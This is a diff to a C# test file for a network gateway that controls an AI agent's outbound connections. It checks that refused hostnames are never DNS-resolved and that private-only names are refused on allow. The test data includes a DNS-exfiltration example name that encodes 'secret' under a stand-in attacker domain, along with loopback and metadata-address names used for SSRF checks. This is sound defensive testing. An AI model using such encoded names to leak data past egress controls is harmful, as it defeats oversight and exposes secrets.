@@ -331,10 +331,10 @@ public sealed class TeamNetworkAllowTests : IAsyncLifetime
         cmd.ExecuteNonQuery();
     }
 
-    // ------------------------------------------------------------------ §3 the gateway resolves before asking
+    // ------------------------------------------------------------------ §3 private-only names: never looked up for the agent
 
     [Fact]
-    public async Task TheGateway_ANameResolvingOnlyToPrivateAddresses_RaisesNoAsk_APublicOneDoes()
+    public async Task TheGateway_NeverLooksUpARefusedName_TheAllowIsRefusedForAPrivateOnlyName()
     {
         await using var f = await GatewayFixture.StartAsync();
         var team = InsertIn(f.Db, "INSERT INTO teams (name, created_at) VALUES ('Alpha', '2026-11-13T00:00:00Z') RETURNING id;");
@@ -343,24 +343,31 @@ public sealed class TeamNetworkAllowTests : IAsyncLifetime
         f.Host.Refusals = asks;
         f.Dialer!.AddName("localtest.me", IPAddress.Loopback);
         f.Dialer.AddName("x.nip.io", IPAddress.Parse("10.1.2.3"));
-        f.Dialer.AddName("link.example.net", IPAddress.Parse("169.254.169.254"), IPAddress.Parse("fe80::1"));
         f.Dialer.AddName("pkgs.example.com", IPAddress.Parse("93.184.216.34"));
+        asks.Resolve = f.Dialer.ResolveAsync;
         await using var gateway = f.StartRun(5);
 
-        foreach (var name in new[] { "localtest.me", "x.nip.io", "link.example.net" })
-        {
-            Assert.DoesNotContain("request_host", await RefusedAsync(gateway, $"CONNECT {name}:443 HTTP/1.1\r\nHost: {name}:443\r\n\r\n"));
-            Assert.DoesNotContain("request_host", await RefusedAsync(gateway, $"GET http://{name}/ HTTP/1.1\r\nHost: {name}\r\n\r\n"));
-        }
-        Assert.Empty(asks.Asks(pendingOnly: false));
-
-        // the control: a name with a public address is asked about, and a plain-http refusal says only https is forwarded
-        Assert.Contains("request_host", await RefusedAsync(gateway, "CONNECT pkgs.example.com:443 HTTP/1.1\r\nHost: pkgs.example.com:443\r\n\r\n"));
+        // An agent's refused names (one could carry data to its own DNS server) are asked about, never looked up.
+        foreach (var name in new[] { "localtest.me", "x.nip.io", "pkgs.example.com", "c2vjcmv0.attacker.example" })
+            Assert.Contains("request_host", await RefusedAsync(gateway, $"CONNECT {name}:443 HTTP/1.1\r\nHost: {name}:443\r\n\r\n"));
         var plain = await RefusedAsync(gateway, "GET http://pkgs.example.com/simple/ HTTP/1.1\r\nHost: pkgs.example.com\r\n\r\n");
         Assert.Contains("Only https is forwarded", plain);
-        var ask = Assert.Single(asks.Asks());
-        Assert.Equal("pkgs.example.com", ask.Host);
-        Assert.True(ask.PlainHttp);
+        Assert.Empty(f.Dialer.Resolved);
+        Assert.True(asks.Asks().Single(a => a.Host == "pkgs.example.com").PlainHttp);
+
+        // The person's Allow looks the name up once: a private-only name is refused (the ask stays for Deny).
+        foreach (var name in new[] { "localtest.me", "x.nip.io" })
+        {
+            var id = asks.Asks().Single(a => a.Host == name).Id;
+            var e = await Assert.ThrowsAsync<ArgumentException>(() => asks.AnswerAsync(id, NetworkAskChoices.Agent, null, Ct));
+            Assert.Contains("private", e.Message);
+            Assert.Contains(asks.Asks(), a => a.Id == id);
+        }
+        var pkgs = asks.Asks().Single(a => a.Host == "pkgs.example.com").Id;
+        await asks.AnswerAsync(pkgs, NetworkAskChoices.Agent, null, Ct);
+        // Deny never looks the name up
+        await asks.AnswerAsync(asks.Asks().Single(a => a.Host == "c2vjcmv0.attacker.example").Id, NetworkAskChoices.Deny, null, Ct);
+        Assert.Equal(["localtest.me", "pkgs.example.com", "x.nip.io"], f.Dialer.Resolved.Order().ToArray());
     }
 
     private static async Task<string> RefusedAsync(RunGateway gateway, string request)
